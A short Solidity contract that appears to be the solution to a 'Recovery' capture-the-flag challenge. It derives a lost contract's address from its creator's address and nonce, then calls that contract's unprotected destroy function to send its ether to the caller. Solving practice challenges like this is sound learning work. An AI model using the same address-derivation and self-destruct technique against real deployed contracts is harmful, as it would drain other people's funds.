// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./17Recovery.sol";

contract RecoverySolution {
    SimpleToken public simpleToken;
    address public creator;

    constructor(address creatorAddress) {
        creator = creatorAddress;
    }

    function getLostContractAddress() public view returns (address) {
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xd6),
                                bytes1(0x94),
                                creator,
                                bytes1(0x01)
                            )
                        )
                    )
                )
            );
    }

    function solveChallenge() public {
        address lostContractAddress = getLostContractAddress();
        simpleToken = SimpleToken(payable(lostContractAddress));
        simpleToken.destroy(payable(msg.sender));
    }
}
